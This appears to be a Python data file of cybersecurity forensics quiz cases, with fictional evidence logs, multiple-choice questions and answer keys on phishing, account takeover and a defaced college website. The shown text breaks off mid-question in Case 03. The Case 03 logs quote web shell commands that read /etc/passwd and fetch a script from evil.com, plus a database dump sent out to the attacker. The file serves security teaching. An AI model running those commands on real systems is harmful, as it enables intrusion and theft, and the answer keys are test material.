# scratch/case_data_batch1.py
# Complete, detailed questions and evidence for Case 01 to Case 05

BATCH_1 = {
    "case-01": {
        "id": "case-01",
        "name": "CASE 01 — STOLEN SOCIAL MEDIA ACCOUNT",
        "summary": "A student's social media account has been taken over. Find how the attacker gained access.",
        "evidence": [
            {
                "tag": "ACCESS LOG",
                "time": "03:15:22 UTC",
                "title": "GEOLOCATION MISMATCH",
                "details": "Account login recorded from IP 194.26.29.112 (Frankfurt, Germany) using Linux/Chrome. The account owner was asleep in Chennai, India."
            },
            {
                "tag": "SECURITY EVENT",
                "time": "03:16:04 UTC",
                "title": "PASSWORD & RECOVERY CHANGE",
                "details": "Account password changed. Recovery email updated from student@college.edu to shadow_relay_99@proton.me. 2FA was not enabled."
            },
            {
                "tag": "DIRECT MESSAGE",
                "time": "Yesterday 18:40 UTC",
                "title": "SUSPICIOUS BADGE VERIFICATION DM",
                "details": "Victim received a message from '@Instagram_Verify_Help' stating: 'Your badge is ready. Click http://insta-badge-claim.xyz to secure your account within 24 hours.'"
            },
            {
                "tag": "BROWSER HISTORY",
                "time": "Yesterday 18:43 UTC",
                "title": "CREDENTIAL FORM ENTRY",
                "details": "Victim visited 'insta-badge-claim.xyz' and entered existing username and current password on an unverified web form."
            }
        ],
        "round2Evidence": [
            {
                "tag": "FORENSIC LOG",
                "time": "03:17:45 UTC",
                "title": "SESSION COOKIE EXFILTRATION",
                "details": "Web server logs demonstrate session cookie dumping. Cookie flag 'HttpOnly' was absent, allowing malicious client-side JavaScript from 'insta-badge-claim.xyz' to exfiltrate active session tokens."
            },
            {
                "tag": "DNS / WHOIS",
                "time": "03:18:10 UTC",
                "title": "BULLETPROOF HOSTING ASN TRACE",
                "details": "Reverse DNS query reveals 'insta-badge-claim.xyz' resolves to IP 194.26.29.112 assigned to a bulletproof hosting provider registered in Victoria, Seychelles with known C2 infrastructure."
            },
            {
                "tag": "OAUTH PERMISSION",
                "time": "03:18:40 UTC",
                "title": "PERSISTENCE VIA THIRD-PARTY APP",
                "details": "Attacker granted full API permissions to rogue application 'AnalyticsBoost_v2', enabling permanent read/write access to student DMs and contacts even after standard password change."
            },
            {
                "tag": "CREDENTIAL AUDIT",
                "time": "03:20:00 UTC",
                "title": "PASSWORD REUSE CORRELATION",
                "details": "Credential analysis shows the student used the identical password across their campus student portal, personal email, and social media, creating an immediate cross-account compromise risk."
            }
        ],
        "questions": [
            # Round 1: 13 very easy, 2 slightly tricky
            {
                "text": "What country did the unauthorized login originate from at 03:15 UTC?",
                "options": ["Germany", "India", "Canada", "Japan"],
                "answer": 0,
                "explanation": "The access log clearly states the login IP 194.26.29.112 was located in Frankfurt, Germany."
            },
            {
                "text": "Where was the actual account owner located at the time of the 03:15 UTC login?",
                "options": ["Chennai, India", "Frankfurt, Germany", "London, UK", "New York, USA"],
                "answer": 0,
                "explanation": "The evidence record states the student was asleep in Chennai, India."
            },
            {
                "text": "What new email address did the attacker change the account recovery to?",
                "options": ["shadow_relay_99@proton.me", "student@college.edu", "admin@instagram.com", "support@meta.org"],
                "answer": 0,
                "explanation": "The security event log shows recovery email was updated to shadow_relay_99@proton.me."
            },
            {
                "text": "What link did the suspicious direct message ask the student to click?",
                "options": ["http://insta-badge-claim.xyz", "https://instagram.com/verify", "http://college.edu/badge", "https://meta.com/help"],
                "answer": 0,
                "explanation": "The DM explicitly urged the user to visit 'http://insta-badge-claim.xyz'."
            },
            {
                "text": "What information did the student type on the unverified website form?",
                "options": ["Their username and current password", "Only their college roll number", "Their home postal address", "Their blood group"],
                "answer": 0,
                "explanation": "The browser history evidence shows the student entered their username and current password."
            },
            {
                "text": "What critical security feature was NOT enabled on the student's social account?",
                "options": ["Two-Factor Authentication (2FA)", "Profile picture", "Dark mode theme", "Story archive"],
                "answer": 0,
                "explanation": "The security event log notes: '2FA was not enabled'."
            },
            {
                "text": "What username sent the fake badge verification direct message?",
                "options": ["@Instagram_Verify_Help", "@official_instagram", "@college_dean", "@support_desk"],
                "answer": 0,
                "explanation": "The DM log shows the sender handle was '@Instagram_Verify_Help'."
            },
            {
                "text": "How much time did the fake message claim the user had to claim their badge?",
                "options": ["24 hours", "7 days", "1 hour", "30 minutes"],
                "answer": 0,
                "explanation": "The message stated: 'Click http://insta-badge-claim.xyz to secure your account within 24 hours.'"
            },
            {
                "text": "Which operating system was recorded in the Frankfurt login access log?",
                "options": ["Linux", "Windows 11", "iOS", "Android"],
                "answer": 0,
                "explanation": "The access log specifies the user agent as Linux/Chrome."
            },
            {
                "text": "What was the student's original legitimate recovery email before it was modified?",
                "options": ["student@college.edu", "shadow_relay_99@proton.me", "student@gmail.com", "user@yahoo.com"],
                "answer": 0,
                "explanation": "The security log notes recovery email updated from student@college.edu."
            },
            {
                "text": "Which browser was reported in the Frankfurt unauthorized login?",
                "options": ["Chrome", "Firefox", "Safari", "Edge"],
                "answer": 0,
                "explanation": "The access log specifies Linux/Chrome."
            },
            {
                "text": "What kind of lure did the scammer use to trick the student into opening the link?",
                "options": ["A verified account badge offer", "A lottery cash prize", "A class exam timetable", "A flight discount coupon"],
                "answer": 0,
                "explanation": "The scammer promised an Instagram verification badge."
            },
            {
                "text": "What protocol was used in the scam link 'http://insta-badge-claim.xyz'?",
                "options": ["Insecure HTTP", "Encrypted HTTPS", "FTP", "SSH"],
                "answer": 0,
                "explanation": "The URL begins with http://, indicating plain unencrypted HTTP."
            },
            # Tricky Q14
            {
                "text": "Why was the 24-hour deadline in the message a major red flag?",
                "options": [
                    "It created false urgency to stop the victim from thinking critically",
                    "Official badges always take at least 6 months to expire",
                    "Social platforms only send notifications on weekends",
                    "Verification badges are deleted every 24 hours by default"
                ],
                "answer": 0,
                "explanation": "Artificial urgency (24-hour pressure) is a classic social engineering psychological tactic."
            },
            # Tricky Q15
            {
                "text": "Even before looking at IP logs, what detail in the URL alone proves it is not Instagram?",
                "options": [
                    "The domain name is 'insta-badge-claim.xyz' instead of 'instagram.com'",
                    "It has more than three letters in the path",
                    "It was typed in lowercase letters",
                    "It was opened through a mobile browser"
                ],
                "answer": 0,
                "explanation": "Official Instagram services operate strictly on instagram.com, not third-party .xyz domains."
            }
        ],
        "round2Questions": [
            # Round 2: 8 medium, 5 medium-hard, 2 challenging
            {
                "text": "What missing cookie security flag allowed client-side scripts to steal the session token?",
                "options": ["HttpOnly", "Secure", "SameSite", "Path"],
                "answer": 0,
                "explanation": "The forensic log explicitly highlights: 'Cookie flag HttpOnly was absent, allowing malicious client-side JavaScript to exfiltrate session tokens.'"
            },
            {
                "text": "To which geographic jurisdiction was the bulletproof hosting provider registered?",
                "options": ["Victoria, Seychelles", "Frankfurt, Germany", "Chennai, India", "Panama City, Panama"],
                "answer": 0,
                "explanation": "The DNS / WHOIS trace details registration in Victoria, Seychelles."
            },
            {
                "text": "What rogue application did the attacker authorize to maintain persistence after password change?",
                "options": ["AnalyticsBoost_v2", "InstaTracker_Free", "BadgeVerify_App", "SocialSecure_v1"],
                "answer": 0,
                "explanation": "The OAuth permission log identified 'AnalyticsBoost_v2' granted full API access."
            },
            {
                "text": "Why would changing the social media password alone NOT remove the attacker's access?",
                "options": [
                    "The rogue third-party OAuth app retained persistent API read/write tokens",
                    "Passwords are only updated on servers once per week",
                    "The attacker still owned the victim's physical smartphone",
                    "The student's Wi-Fi router was infected with firmware malware"
                ],
                "answer": 0,
                "explanation": "Third-party OAuth permissions remain valid independently of password resets until explicitly revoked."
            },
            {
                "text": "What major risk was identified during the student's credential audit?",
                "options": [
                    "Reusing the identical password across college portal, email, and social media",
                    "Using a password that contained more than 16 characters",
                    "Changing passwords on a monthly basis",
                    "Storing passwords in an encrypted password manager"
                ],
                "answer": 0,
                "explanation": "The audit revealed password reuse across campus portal, email, and social media."
            },
            {
                "text": "How did the attacker gain knowledge of the student's password in the first place?",
                "options": [
                    "The student voluntarily submitted it on the phishing web form",
                    "By brute-forcing 10 million combinations over 3 days",
                    "By intercepting campus satellite signals",
                    "By guessing the student's pet name"
                ],
                "answer": 0,
                "explanation": "Browser history confirmed the victim typed their username and current password on the fake site."
            },
            {
                "text": "What is the primary operational purpose of a 'bulletproof host' for cybercriminals?",
                "options": [
                    "To ignore law enforcement take-down requests and abuse notices",
                    "To provide faster internet speeds for gamers",
                    "To offer free cloud backups for university students",
                    "To automatically patch zero-day vulnerabilities"
                ],
                "answer": 0,
                "explanation": "Bulletproof hosts deliberately refuse abuse complaints and resist subpoenas to protect illegal operations."
            },
            {
                "text": "Why did the attacker change the account recovery email immediately upon gaining access?",
                "options": [
                    "To prevent the legitimate owner from triggering a password reset recovery",
                    "To reduce spam in the student's inbox",
                    "To test if ProtonMail servers were active",
                    "To share photos with other classmates"
                ],
                "answer": 0,
                "explanation": "Overwriting recovery email locks out the victim and routes recovery links exclusively to the attacker."
            },
            # Medium-Hard Q9-Q13
            {
                "text": "If 2FA had been enabled using an Authenticator App, how would it have affected the attacker at 03:15 UTC?",
                "options": [
                    "The login would be blocked because the attacker lacked the time-based OTP code",
                    "The login would succeed because the attacker had the password",
                    "The student's phone would automatically power off",
                    "The password would be deleted from Instagram servers"
                ],
                "answer": 0,
                "explanation": "Time-based one-time passwords (TOTP) require physical device possession, blocking remote logins even with valid passwords."
            },
            {
                "text": "What correlation exists between the IP in the access log and the domain resolution in Round 2?",
                "options": [
                    "Both point to IP 194.26.29.112, connecting the phishing site to the Frankfurt login",
                    "One is an IPv4 address while the other is an IPv6 address",
                    "The access log IP was in India while the domain IP was in Japan",
                    "There is no correlation between the two records"
                ],
                "answer": 0,
                "explanation": "Both the access log and the reverse DNS for insta-badge-claim.xyz point to 194.26.29.112."
            },
            {
                "text": "Why is the use of ProtonMail by the attacker significant in this investigation?",
                "options": [
                    "It provides end-to-end encryption and does not easily reveal user identity logs",
                    "It only functions on Linux computers",
                    "It automatically deletes sent emails after 10 seconds",
                    "It is the official email service used by university staff"
                ],
                "answer": 0,
                "explanation": "ProtonMail is privacy-centric, making anonymous adversary attribution more difficult without lawful court orders."
            },
            {
                "text": "What step must the student take FIRST to prevent cross-account compromise?",
                "options": [
                    "Immediately change passwords on their campus portal and personal email",
                    "Delete all photos from their phone gallery",
                    "Purchase a new laptop",
                    "Turn off their Wi-Fi router for 48 hours"
                ],
                "answer": 0,
                "explanation": "Because the same password was reused, campus and email accounts are vulnerable and require instant password resets."
            },
            {
                "text": "What does the 'HttpOnly' flag protect against when properly configured on session cookies?",
                "options": [
                    "It prevents client-side JavaScript from accessing 'document.cookie' during XSS attacks",
                    "It encrypts the entire hard drive of the user's computer",
                    "It forces all website images to load over HTTPS",
                    "It blocks users from clicking hyperlinks"
                ],
                "answer": 0,
                "explanation": "HttpOnly prevents browser scripts from reading sensitive session cookies, mitigating token theft via XSS."
            },
            # Challenging Q14-Q15
            {
                "text": "Reconstructing the timeline, which event occurred FIRST in the attacker's chain of compromise?",
                "options": [
                    "Sending the social engineering DM with the phishing link",
                    "Logging in from Frankfurt IP 194.26.29.112",
                    "Authorizing the AnalyticsBoost_v2 application",
                    "Changing the recovery email to ProtonMail"
                ],
                "answer": 0,
                "explanation": "The DM was sent 'Yesterday 18:40 UTC', luring the victim to submit credentials hours before the 03:15 UTC login."
            },
            {
                "text": "What is the complete remediation checklist required to fully recover and secure this account?",
                "options": [
                    "Reset password, restore recovery email, revoke OAuth app permissions, and enable 2FA",
                    "Simply change the password and leave all other settings unchanged",
                    "Report the account as deleted and register a brand new account",
                    "Restart the computer and clear the browser cache once"
                ],
                "answer": 0,
                "explanation": "Comprehensive recovery requires resetting credentials, fixing recovery channels, revoking rogue OAuth apps, and turning on 2FA."
            }
        ]
    },

    "case-02": {
        "id": "case-02",
        "name": "CASE 02 — PHISHING EMAIL ATTACK",
        "summary": "A student receives a suspicious email asking for login details. Identify the clues that reveal the phishing attempt.",
        "evidence": [
            {
                "tag": "EMAIL HEADER",
                "time": "08:12:00 UTC",
                "title": "SPOOFED SENDER ADDRESS",
                "details": "Display name: 'College Admin Portal'. Actual sender header: 'service-notice@tjs-college-verify.co.vu'. The official college domain is 'tjs.edu.in'."
            },
            {
                "tag": "EMAIL BODY",
                "time": "08:12:00 UTC",
                "title": "URGENT THREAT NOTICE",
                "details": "'URGENT: Your student portal access will be permanently terminated in 3 hours unless you confirm your password immediately.'"
            },
            {
                "tag": "HYPERLINK TRACE",
                "time": "08:14:15 UTC",
                "title": "MISMATCHED DESTINATION URL",
                "details": "Button text: 'Verify Student Portal'. Hyperlink target: 'http://172.67.182.20/portal-login/index.php'. Notice the non-HTTPS plain IP address."
            },
            {
                "tag": "ATTACHMENT SCAN",
                "time": "08:15:20 UTC",
                "title": "ATTACHED HTML FILE",
                "details": "File attached: 'Account_Verification_Form.html'. Contains obfuscated JavaScript designed to transmit submitted form data to an external server."
            }
        ],
        "round2Evidence": [
            {
                "tag": "EMAIL HEADER",
                "time": "08:14:12 UTC",
                "title": "SPF, DKIM & DMARC MISALIGNMENT",
                "details": "Header analysis reveals 'Received-SPF: softfail (~all)', 'DKIM-Signature: d=spoof-mailer.biz (fail)', and 'DMARC: p=quarantine'. The visible sender claimed to be 'admin@college.edu'."
            },
            {
                "tag": "SMTP RELAY",
                "time": "08:14:15 UTC",
                "title": "OPEN RELAY HOP DISCOVERY",
                "details": "Hop tracking demonstrates the email originated from an insecure open SMTP relay at IP 200.147.35.12 located in Brazil, bypassing college campus mail submission filters."
            },
            {
                "tag": "ATTACHMENT",
                "time": "08:15:00 UTC",
                "title": "OBFUSCATED HTML SMUGGLING",
                "details": "Attachment 'Fee_Statement_2026.html' contains an embedded Base64-encoded JavaScript blob utilizing 'unescape()' and Blob URL generation to reconstruct a credential harvester offline."
            },
            {
                "tag": "DNS / MX",
                "time": "08:16:30 UTC",
                "title": "LOOKALIKE HOMOGLYPH DOMAIN",
                "details": "Target URL embedded in the HTML file resolves to 'cоllege.edu' utilizing Cyrillic small letter 'о' (U+043E), creating a visually indistinguishable homoglyph domain."
            }
        ],
        "questions": [
            # Round 1
            {
                "text": "What is the official email domain of the college according to the evidence?",
                "options": ["tjs.edu.in", "tjs-college-verify.co.vu", "college-admin.com", "verify-portal.net"],
                "answer": 0,
                "explanation": "Evidence 1 states: 'The official college domain is tjs.edu.in'."
            },
            {
                "text": "What fake sender address was found in the email header?",
                "options": ["service-notice@tjs-college-verify.co.vu", "admin@tjs.edu.in", "principal@tjs.edu.in", "helpdesk@college.ac.in"],
                "answer": 0,
                "explanation": "The header showed 'service-notice@tjs-college-verify.co.vu'."
            },
            {
                "text": "What time limit did the phishing email threaten before portal termination?",
                "options": ["3 hours", "24 hours", "7 days", "10 minutes"],
                "answer": 0,
                "explanation": "The email body stated access will be permanently terminated in 3 hours."
            },
            {
                "text": "What was the label text written on the button inside the email?",
                "options": ["Verify Student Portal", "Download Marks", "View Timetable", "Pay Semester Fee"],
                "answer": 0,
                "explanation": "The hyperlink trace indicates button text: 'Verify Student Portal'."
            },
            {
                "text": "What was the actual destination link behind the 'Verify Student Portal' button?",
                "options": ["http://172.67.182.20/portal-login/index.php", "https://tjs.edu.in/portal", "https://google.com/login", "http://college.edu/home"],
                "answer": 0,
                "explanation": "The hyperlink target pointed to plain IP address 'http://172.67.182.20/portal-login/index.php'."
            },
            {
                "text": "What file was attached directly to the phishing email?",
                "options": ["Account_Verification_Form.html", "syllabus_2026.pdf", "exam_results.xlsx", "college_photo.jpg"],
                "answer": 0,
                "explanation": "The attachment scan identified 'Account_Verification_Form.html'."
            },
            {
                "text": "What did the attached HTML file contain according to the scanner?",
                "options": ["Obfuscated JavaScript to steal submitted form data", "A clean university academic calendar", "An audio recording of a lecture", "A spreadsheet of library books"],
                "answer": 0,
                "explanation": "The scanner reported obfuscated JavaScript designed to transmit form inputs to an external server."
            },
            {
                "text": "Why is an IP address like '172.67.182.20' suspicious in a college login link?",
                "options": [
                    "Official college portals use secure domain names with HTTPS, not raw IP addresses",
                    "IP addresses cannot display web pages",
                    "IP addresses are only used for gaming consoles",
                    "All numbers in URLs are automatically blocked by the government"
                ],
                "answer": 0,
                "explanation": "Legitimate institutional portals rely on registered domains with SSL certificates, not raw IP destinations."
            },
            {
                "text": "What display name did the attacker configure to look legitimate?",
                "options": ["College Admin Portal", "Google Security Team", "Bank Branch Manager", "Campus Sports Club"],
                "answer": 0,
                "explanation": "The sender configured the display name as 'College Admin Portal'."
            },
            {
                "text": "What psychological emotion does the email exploit by threatening 3-hour termination?",
                "options": ["Panic and fear of losing portal access", "Happiness and excitement", "Curiosity about sports", "Patience and relaxation"],
                "answer": 0,
                "explanation": "Threatening immediate lockout creates panic, urging hasty compliance without verification."
            },
            {
                "text": "What top-level domain ending did the fake sender domain use?",
                "options": [".co.vu", ".edu.in", ".gov.in", ".ac.in"],
                "answer": 0,
                "explanation": "The domain used was 'tjs-college-verify.co.vu'."
            },
            {
                "text": "Which security protocol is noticeably absent in 'http://172.67.182.20'?",
                "options": ["HTTPS encryption (SSL/TLS)", "Bluetooth", "Wi-Fi Direct", "HDMI"],
                "answer": 0,
                "explanation": "The link uses unencrypted HTTP rather than secure HTTPS."
            },
            {
                "text": "What action should a student take upon receiving an email asking for passwords?",
                "options": [
                    "Never enter passwords; report the email to the college IT department",
                    "Immediately reply with their password to be safe",
                    "Forward the email to all friends asking them to verify",
                    "Click the link on three different devices"
                ],
                "answer": 0,
                "explanation": "Legitimate administrators never ask for passwords via email; reporting to IT is the correct protocol."
            },
            # Tricky Q14
            {
                "text": "Why do phishing emails often attach an HTML file instead of hosting a web link?",
                "options": [
                    "To evade network web filters and run the malicious form locally in the victim's browser",
                    "Because HTML files can only be opened on supercomputers",
                    "Because attachments guarantee the email is free of viruses",
                    "To save storage space on the college mail server"
                ],
                "answer": 0,
                "explanation": "Local HTML forms bypass perimeter web URL blockers until form submission occurs."
            },
            # Tricky Q15
            {
                "text": "What is the primary indicator that 'College Admin Portal' is not the true sender?",
                "options": [
                    "The underlying email address header does not match the official college domain",
                    "The email was received during morning hours",
                    "The email had a subject line in English",
                    "The email was sent to multiple recipients"
                ],
                "answer": 0,
                "explanation": "Display names can be set arbitrarily; the actual sender header exposes the true originating domain."
            }
        ],
        "round2Questions": [
            # Round 2
            {
                "text": "What did the SPF authentication check return in the email header analysis?",
                "options": ["softfail (~all)", "pass", "temperror", "none"],
                "answer": 0,
                "explanation": "The header explicitly noted: 'Received-SPF: softfail (~all)'."
            },
            {
                "text": "In which country was the insecure open SMTP relay located?",
                "options": ["Brazil", "Germany", "India", "Russia"],
                "answer": 0,
                "explanation": "The hop tracking identified IP 200.147.35.12 located in Brazil."
            },
            {
                "text": "What technique was used in 'Fee_Statement_2026.html' to construct the harvester offline?",
                "options": ["HTML Smuggling via Base64 blob decoding", "SQL Injection", "Buffer Overflow", "Cross-Site Request Forgery"],
                "answer": 0,
                "explanation": "Evidence 3 details 'Obfuscated HTML Smuggling' utilizing Base64 and Blob URL generation."
            },
            {
                "text": "What specific Unicode character trick was employed in the lookalike homoglyph domain?",
                "options": [
                    "Cyrillic small letter 'о' (U+043E) replacing Latin 'o'",
                    "Greek capital Omega replacing 'O'",
                    "Arabic numeral '0' replacing letter 'O'",
                    "Emoji icon replacing the dot"
                ],
                "answer": 0,
                "explanation": "The DNS evidence specifies Cyrillic small letter 'о' (U+043E) forming 'cоllege.edu'."
            },
            {
                "text": "What DMARC policy was published by the victim domain according to the header?",
                "options": ["p=quarantine", "p=none", "p=reject", "p=disable"],
                "answer": 0,
                "explanation": "The header states: 'DMARC: p=quarantine'."
            },
            {
                "text": "Why did the attacker route the email through an open SMTP relay in Brazil?",
                "options": [
                    "To obscure the real sender IP and bypass reputation filters",
                    "Because Brazilian servers have lower electricity costs",
                    "To translate the email into Portuguese",
                    "Because college emails can only be sent from South America"
                ],
                "answer": 0,
                "explanation": "Open relays allow unauthorized third parties to route spoofed emails, hiding the actual origin."
            },
            {
                "text": "What is the primary danger of homoglyph domain attacks (IDN homograph attacks)?",
                "options": [
                    "They look visually identical to trusted domain names in modern browser address bars",
                    "They crash the user's internet modem instantly",
                    "They prevent search engines from working",
                    "They only work on mobile phones"
                ],
                "answer": 0,
                "explanation": "Homoglyphs use different Unicode scripts that render identically, deceiving even observant users."
            },
            {
                "text": "What function does HTML smuggling serve in bypassing corporate email security gateways?",
                "options": [
                    "The payload is generated dynamically inside the browser, avoiding static gateway signatures",
                    "It physically unplugs the gateway firewall",
                    "It encrypts the entire email gateway hard disk",
                    "It transforms the email into a PDF document"
                ],
                "answer": 0,
                "explanation": "Gateways cannot easily inspect files that do not exist until assembled by client-side browser JavaScript."
            },
            # Medium-Hard Q9-Q13
            {
                "text": "Why did DKIM verification fail with 'd=spoof-mailer.biz'?",
                "options": [
                    "The cryptographic signature domain did not match the claimed sender domain",
                    "The email was sent without any text in the body",
                    "The student had not installed the DKIM software on their laptop",
                    "The college mail server was powered off"
                ],
                "answer": 0,
                "explanation": "DKIM signs emails cryptographically; a signature from spoof-mailer.biz fails alignment for college.edu."
            },
            {
                "text": "If the college DMARC policy had been set to 'p=reject' instead of 'p=quarantine', what would have happened?",
                "options": [
                    "The receiving mail server would outright drop the email, preventing delivery to the student",
                    "The email would still be delivered straight to the Primary Inbox",
                    "The attacker would receive an automated apology email",
                    "All college email accounts would be suspended"
                ],
                "answer": 0,
                "explanation": "'p=reject' instructs receiving servers to completely reject unaligned spoofed messages."
            },
            {
                "text": "What is the role of the Base64 encoding used inside the attached HTML file?",
                "options": [
                    "To hide malicious code from simple text-matching antivirus scanners",
                    "To compress the file size so it fits on a floppy disk",
                    "To speed up the student's internet connection",
                    "To make the web page display in colorful fonts"
                ],
                "answer": 0,
                "explanation": "Adversaries encode JavaScript payloads in Base64 to conceal explicit malicious keywords from string inspection."
            },
            {
                "text": "Which email authentication record is explicitly published in the domain DNS to list authorized sending IPs?",
                "options": ["SPF (Sender Policy Framework)", "CNAME", "A Record", "PTR"],
                "answer": 0,
                "explanation": "SPF TXT records list the specific IP addresses authorized to send emails on behalf of that domain."
            },
            {
                "text": "How can an email client or browser protect users against homoglyph attacks?",
                "options": [
                    "By displaying internationalized domains in Punycode format (e.g., 'xn--...')",
                    "By blocking all websites registered on Tuesdays",
                    "By converting all incoming emails to black-and-white text",
                    "By disabling DNS resolution completely"
                ],
                "answer": 0,
                "explanation": "Displaying Punycode makes spoofed internationalized domain labels visibly distinct from Latin characters."
            },
            # Challenging Q14-Q15
            {
                "text": "Analyzing the combined email headers, what three authentication failures definitively prove email spoofing?",
                "options": [
                    "SPF softfail, DKIM domain mismatch (spoof-mailer.biz), and DMARC alignment failure",
                    "Missing subject line, missing date, and missing attachment",
                    "Plain text encoding, English language, and standard font size",
                    "Sender used Gmail, receiver used Outlook, and delivery took 2 seconds"
                ],
                "answer": 0,
                "explanation": "The failure of SPF, DKIM alignment, and DMARC together proves sender spoofing beyond doubt."
            },
            {
                "text": "What is the most effective architectural defense for the college IT team to prevent future spoofing of their domain?",
                "options": [
                    "Enforce strict DMARC 'p=reject' policy with 100% DKIM and SPF alignment",
                    "Ask all students to stop reading emails on mobile devices",
                    "Block all emails containing the word 'urgent'",
                    "Change the college website background color to red"
                ],
                "answer": 0,
                "explanation": "Publishing DMARC with 'p=reject' guarantees unauthorized mail servers cannot deliver spoofed emails."
            }
        ]
    },

    "case-03": {
        "id": "case-03",
        "name": "CASE 03 — HACKED COLLEGE WEBSITE",
        "summary": "The college website has been changed without permission. Investigate the evidence to understand how access was gained.",
        "evidence": [
            {
                "tag": "WEBSITE DEFACEMENT",
                "time": "02:10:00 UTC",
                "title": "HOME PAGE DEFACED",
                "details": "Homepage 'index.html' replaced with banner: 'HACKED BY GHOST_SEC'. News feed articles deleted."
            },
            {
                "tag": "WEB SERVER LOG",
                "time": "01:55:12 UTC",
                "title": "CMS ADMIN PORTAL BRUTE FORCE",
                "details": "Over 4,500 POST requests to '/admin/login.php' from IP 45.142.122.9 in 10 minutes. Final request returned HTTP 200 (Success) for username 'admin'."
            },
            {
                "tag": "CONFIG AUDIT",
                "time": "02:25:00 UTC",
                "title": "DEFAULT CREDENTIALS FOUND",
                "details": "Web CMS administrator account had password set to 'admin123'. Account had not enforced rate limiting or account lockout."
            },
            {
                "tag": "FILE UPLOAD LOG",
                "time": "02:02:40 UTC",
                "title": "WEB SHELL UPLOAD",
                "details": "File 'gallery_photo.php' uploaded via the unauthenticated image upload endpoint in the student gallery plugin."
            }
        ],
        "round2Evidence": [
            {
                "tag": "APACHE ACCESS LOG",
                "time": "02:04:15 UTC",
                "title": "WEB SHELL COMMAND EXECUTION",
                "details": "HTTP GET requests to '/uploads/gallery_photo.php?cmd=whoami' returned 'www-data'. Followed by '?cmd=cat%20/etc/passwd' and '?cmd=wget%20http://evil.com/backdoor.sh'."
            },
            {
                "tag": "FILE INTEGRITY",
                "time": "02:08:30 UTC",
                "title": "HTACCESS REDIRECTION TAMPER",
                "details": ".htaccess file overwritten with RewriteRule redirecting all incoming student traffic on mobile devices to a fraudulent ad-revenue network."
            },
            {
                "tag": "DATABASE DUMP",
                "time": "02:06:50 UTC",
                "title": "MYSQL DUMP EXFILTRATION",
                "details": "Execution of 'mysqldump -u root -p college_portal > /var/www/html/backup.sql' followed by outbound HTTP download to adversary IP 45.142.122.9."
            },
            {
                "tag": "PERMISSION AUDIT",
                "time": "02:28:00 UTC",
                "title": "OVERLY PERMISSIVE DIRECTORY",
                "details": "Directory '/var/www/html/uploads' had full 777 read-write-execute permissions and lacked PHP execution restrictions in Apache virtual host configuration."
            }
        ],
        "questions": [
            # Round 1
            {
                "text": "What message was displayed on the defaced college homepage?",
                "options": ["HACKED BY GHOST_SEC", "SERVER UNDER MAINTENANCE", "EXAM POSTPONED", "WELCOME FRESHERS"],
                "answer": 0,
                "explanation": "Evidence 1 states the homepage was replaced with the banner 'HACKED BY GHOST_SEC'."
            },
            {
                "text": "What weak password was discovered on the CMS administrator account?",
                "options": ["admin123", "P@ssw0rd2026", "college_secure", "admin!@#"],
                "answer": 0,
                "explanation": "Evidence 3 notes the CMS administrator password was set to default 'admin123'."
            },
            {
                "text": "How many login attempts were launched against '/admin/login.php' in 10 minutes?",
                "options": ["Over 4,500", "Exactly 10", "Only 2", "50,000"],
                "answer": 0,
                "explanation": "Evidence 2 states: 'Over 4,500 POST requests to /admin/login.php in 10 minutes'."
            },
            {
                "text": "What malicious file was uploaded through the student gallery plugin?",
                "options": ["gallery_photo.php", "student_id.pdf", "logo.png", "exam_hall.jpg"],
                "answer": 0,
                "explanation": "Evidence 4 records: 'File gallery_photo.php uploaded via unauthenticated endpoint'."
            },
            {
                "text": "What IP address carried out the brute force attack on the admin portal?",
                "options": ["45.142.122.9", "192.168.1.1", "10.0.0.1", "127.0.0.1"],
                "answer": 0,
                "explanation": "Evidence 2 identifies the attacker IP as 45.142.122.9."
            },
            {
                "text": "What critical security defense was missing on the login portal to stop thousands of rapid attempts?",
                "options": ["Rate limiting or account lockout", "A blue background theme", "A student feedback form", "An email newsletter signup"],
                "answer": 0,
                "explanation": "Evidence 3 states the account had not enforced rate limiting or account lockout."
            },
            {
                "text": "Which endpoint in the student gallery plugin was exploited by the attacker?",
                "options": ["Unauthenticated image upload endpoint", "Contact Us form", "Library book search", "Campus map viewer"],
                "answer": 0,
                "explanation": "Evidence 4 notes the file was uploaded via the unauthenticated image upload endpoint."
            },
            {
                "text": "What HTTP status code indicated that the attacker successfully logged in?",
                "options": ["HTTP 200 (Success)", "HTTP 404 (Not Found)", "HTTP 500 (Internal Error)", "HTTP 403 (Forbidden)"],
                "answer": 0,
                "explanation": "Evidence 2 states: 'Final request returned HTTP 200 (Success) for username admin'."
            },
            {
                "text": "Which file was defaced to alter the look of the website homepage?",
                "options": ["index.html", "about.html", "contact.php", "styles.css"],
                "answer": 0,
                "explanation": "Evidence 1 records: 'Homepage index.html replaced with banner'."
            },
            {
                "text": "What type of attack involves repeatedly guessing passwords until the correct one is found?",
                "options": ["Brute Force attack", "Phishing attack", "Denial of Service attack", "SQL Injection"],
                "answer": 0,
                "explanation": "Sending thousands of automated password guesses is known as a brute force attack."
            },
            {
                "text": "Why is uploading a file ending in '.php' instead of '.jpg' to an image gallery dangerous?",
                "options": [
                    "A PHP file can be executed by the web server to run arbitrary attacker commands",
                    "A PHP file cannot be viewed on mobile phones",
                    "PHP files take up 100 times more storage space",
                    "PHP files automatically delete user mouse drivers"
                ],
                "answer": 0,
                "explanation": "Web servers execute PHP code upon request, allowing an uploaded PHP web shell to control the server."
            },
            {
                "text": "What username was targeted by the brute force attack in the server logs?",
                "options": ["admin", "student", "teacher", "guest"],
                "answer": 0,
                "explanation": "Evidence 2 reports: 'Final request returned HTTP 200 (Success) for username admin'."
            },
            {
                "text": "What should the system administrator change immediately after regaining control?",
                "options": ["The default administrator password to a strong, unique password", "The college logo", "The monitor brightness", "The keyboard font"],
                "answer": 0,
                "explanation": "Changing default credentials to a strong password is the most urgent remediation step."
            },
            # Tricky Q14
            {
                "text": "Why did the image upload feature accept a '.php' file in the first place?",
                "options": [
                    "The backend code lacked file extension and MIME type validation",
                    "The server ran out of hard disk memory",
                    "The website was hosted on a Linux computer",
                    "The PHP file was smaller than 10 kilobytes"
                ],
                "answer": 0,
                "explanation": "Without server-side extension whitelisting, arbitrary scripts can be uploaded disguised as images."
            },
            # Tricky Q15
            {
                "text": "What distinguishes website defacement from a purely silent data theft attack?",
                "options": [
                    "Defacement is intentionally public and visible to cause reputational damage",
                    "Defacement always destroys the physical server hardware",
                    "Defacement only affects web browsers on Apple devices",
                    "Defacement requires physical access to the college server room"
                ],
                "answer": 0,
                "explanation": "Defacement prioritizes visible vandalism and public notoriety over clandestine data gathering."
            }
        ],
        "round2Questions": [
            # Round 2
            {
                "text": "What operating system user account was revealed by the 'whoami' command in the web shell?",
